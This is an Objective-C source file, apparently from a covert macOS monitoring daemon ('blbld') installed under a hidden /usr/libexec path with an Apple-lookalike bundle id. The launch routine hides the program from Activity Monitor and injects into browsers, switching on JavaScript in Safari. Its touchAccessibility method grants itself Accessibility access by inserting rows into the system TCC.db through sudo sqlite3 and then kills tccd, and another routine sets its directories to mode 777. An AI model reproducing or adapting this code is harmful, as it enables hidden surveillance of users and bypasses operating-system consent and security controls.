//
//  blbldAppDelegate.m
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "blbldAppDelegate.h"
#import "blbldController.h"
#import "ActivityHider.h"
#import "BrowserInjector.h"

#import "DaemonPrivateHome.h"
#import "blbldUtils.h"

#import <SystemConfiguration/SystemConfiguration.h>
#include <sys/sysctl.h>

@interface blbldAppDelegate (private)
- (void) setUpHomeDirectory;
@end

@implementation blbldAppDelegate

@synthesize window;
@synthesize mArgs, mblbldController;
@synthesize mActivityHider;
@synthesize mBrowserInjector;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    
    /**********************************************************************************************************
     Arguments:
     0 /usr/libexec/.blblu/blblu/Contents/Resources/Launch.sh
     1 /usr/libexec/.blblu/blblu/Contents/MacOS/blblu
     2 blblu
     3 blblu-load-all
     4 /usr/libexec/.blblu/blblu/Contents/Resources/kbls.app/Contents/MacOS/kbls
     5 kbls
     6 kbls-load-all
     7 /usr/libexec/.blblu/blblu/Contents/Resources/ActivityHider/ActivityHider
     8 /usr/libexec/.blblu/blblu/Contents/Resources/BrowserInjector/BrowserInjector
     **********************************************************************************************************/
    
    NSArray *args = [[NSProcessInfo processInfo] arguments];
    [self setMArgs:args];
    DLog(@"###### FinishLaunching, launching args, %@", self.mArgs);
    DLog(@"AXIsProcessTrusted = %d, AXAPIEnabled = %d", AXIsProcessTrusted(), AXAPIEnabled());
    
    // -- Prepare home directory & accessibility
    [self setUpHomeDirectory];
    [self touchAccessibility];
    
    // -- Monitor update or uninstallation or ...
    self.mblbldController = [blbldController sharedblbldController];
    
    // -- Activity Monitor
    mActivityHider = [[ActivityHider alloc]init];
    mActivityHider.mActivityHiderPath = [self.mArgs objectAtIndex:7];
    [mActivityHider start];
    
    if ([blbldUtils isActivityMonitorIsRunning]) {
        [blbldUtils hideActivityMonitor:mActivityHider.mActivityHiderPath];
    }
    
    // -- Browser Injecter
    mBrowserInjector = [[BrowserInjector alloc] init];
    mBrowserInjector.mBrowserInjectorPath = [self.mArgs objectAtIndex:8];
    [mBrowserInjector start];
    
    if ([blbldUtils isSafariIsRunning]) {
        [blbldUtils allowJavaScriptInSafari:mBrowserInjector.mBrowserInjectorPath];
    }
}

#pragma mark Private methods
#pragma mark -

- (void) setUpHomeDirectory {
    NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
    NSString *sharedHome = [DaemonPrivateHome daemonSharedHome];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedHome];
    NSString *command = [NSString stringWithFormat:@"chmod -R 777 %@", sharedHome];
    system([command cStringUsingEncoding:NSUTF8StringEncoding]);
    
    NSString* etcPath = [privateHome stringByAppendingString:@"etc/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:etcPath];
    command = [NSString stringWithFormat:@"chmod -R 777 %@", etcPath];
    system([command cStringUsingEncoding:NSUTF8StringEncoding]);
}

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
- (void) touchAccessibility {
    SInt32 OSXversionMajor = 0, OSXversionMinor = 0;
    if (Gestalt(gestaltSystemVersionMajor, &OSXversionMajor) == noErr && Gestalt(gestaltSystemVersionMinor, &OSXversionMinor) == noErr)
    {
        // 10.6 - 10.8
        if(OSXversionMajor == 10 && OSXversionMinor >= 6 && OSXversionMajor == 10 && OSXversionMinor <= 8 ) {
            system("sudo touch /private/var/db/.AccessibilityAPIEnabled");
        }
        // >= 10.9 - 10.10
        else if(OSXversionMajor == 10 && OSXversionMinor >= 9 && OSXversionMajor == 10 && OSXversionMinor <= 10 ) {
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.blbld',0,1,1,NULL);\"");
        }
        // >= 10.11
        else if(OSXversionMajor == 10 && OSXversionMinor >= 11) {
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.blbld',0,1,1,NULL,NULL);\"");
        }
    }
    
    // Make touch take effect
    system("sudo killall -9 tccd");
}
#pragma GCC diagnostic pop

#pragma mark Memory management
#pragma mark -

- (void) dealloc {
    [mActivityHider stop];
    [mActivityHider release];
    [mArgs release];
    [super dealloc];
}

@end
